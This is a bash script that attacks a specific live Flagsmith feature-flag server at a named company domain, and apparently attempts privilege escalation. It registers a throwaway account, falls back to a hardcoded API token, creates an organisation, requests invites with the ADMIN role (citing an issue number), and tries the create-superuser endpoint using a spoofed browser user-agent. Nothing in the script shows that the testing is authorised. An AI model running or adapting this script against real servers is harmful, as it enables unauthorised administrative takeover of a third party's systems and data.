#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# Register fresh account
ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
  -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"email\":\"kw-v26-$(date +%s)@proton.me\",\"password\":\"Hy7Nm3Qw9Rx!\",\"first_name\":\"T\",\"last_name\":\"S\"}" --max-time 15)
KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
echo "Key: $KEY"

if [ -z "$KEY" ]; then
  KEY="e43b0d44b4b43efb28b21fef7bee5977203f0276"
  echo "Fallback"
fi

# Get our org ID
ORG=$(curl -s "https://flagsmith.koinworks.com/api/v1/organisations/" \
  -H "Authorization: Token $KEY" -H "User-Agent: $UA" --max-time 10)
OID=$(echo "$ORG" | python3 -c "import json,sys; d=json.load(sys.stdin); r=d.get('results',[]); print(r[0]['id'] if r else '')" 2>/dev/null)
echo "Org: $OID"

# If no org, create one
if [ -z "$OID" ]; then
  ORG=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d '{"name":"v26"}' --max-time 10)
  OID=$(echo "$ORG" | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
  echo "Created Org: $OID"
fi

# Test 1: Create invite with ADMIN role (Issue #4681)
echo "=== ADMIN INVITE ==="
resp=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/${OID}/invites/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"email":"kw-admin-escalated@proton.me","role":"ADMIN"}' --max-time 15)
echo "Invite: $resp"

# Test 2: Create invite with role in different format
echo "=== ADMIN INVITE V2 ==="
resp2=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/${OID}/invites/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"email":"kw-admin-v2@proton.me","frontend_base_url":"https://flagsmith.koinworks.com","role":"ADMIN"}' --max-time 15)
echo "Invite v2: $resp2"

# Test 3: Check current role
echo "=== CURRENT ROLE ==="
curl -s "https://flagsmith.koinworks.com/api/v1/auth/users/me/" \
  -H "Authorization: Token $KEY" -H "User-Agent: $UA" --max-time 10
echo ""

# Test 4: Try create-superuser with our token (might work after escalation)  
echo "=== CREATE SUPERUSER ==="
curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/create-superuser/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"email":"kw-super@proton.me","password":"SuperAdmin2026!X","first_name":"Super","last_name":"Admin"}' --max-time 15
echo ""
